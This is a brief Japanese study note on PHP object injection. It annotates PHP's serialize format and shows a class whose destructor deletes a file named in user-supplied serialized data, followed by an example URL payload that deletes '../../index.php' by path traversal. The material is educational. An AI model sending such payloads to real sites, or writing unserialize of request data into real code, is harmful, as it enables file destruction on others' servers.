# Unserialize
## Serializeの基本
```php
<?php
class Example1{
    public $cache_file;
}
class Example2{
    public $cache_file;
    public $array = array("key" => 100);
}

$ex1 = new Example1();
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";N;}
$ex1->cache_file = "index.php";
echo serialize($ex1)."\n";  // O:8:"Example1":1:{s:10:"cache_file";s:9:"index.php";}

$ex2 = new Example2();
echo serialize($ex2)."\n";  // O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}

// O:8:"Example2":2:{s:10:"cache_file";N;s:5:"array";a:1:{s:3:"key";i:100;}}
// Oは「”Example2”というObjectをシリアル化している」の意味
// 8は”Example2”の文字数
// 2は「フィールドが二つある」の意味
// sはStringの意味？
// 10は"cache_file"の文字数
// Nは値がセットされていないという意味。{変数名;値}でワンセットっぽい
// 最後の"i:100;"はint型の値100という意味
?>
```
## __destruct
```php
class Example1
{
   public $cache_file;

   function __construct(){
      // some PHP code...
   }
   // インスタンス削除時にデストラクタを実行して$cache_fileを削除する
   function __destruct(){
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

$user_data = unserialize($_GET['data']);

// some PHP code..
```
以下で、Example1クラスのオブジェクトとして復元して、Example1クラスのインスタンスを`$user_data`に代入するので、`$user_data`インスタンスが削除されるときに`../../index.php`が削除されてしまう！   
```txt
http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
```
## __wakeup

## AuthBypass TypeJuggling
## AuthBypass ObjectReference
## POP chain (SQL Injection)
# 参考
https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
基本的な説明。わかりやすい。   
https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
具体例がたくさん。よさげ。   
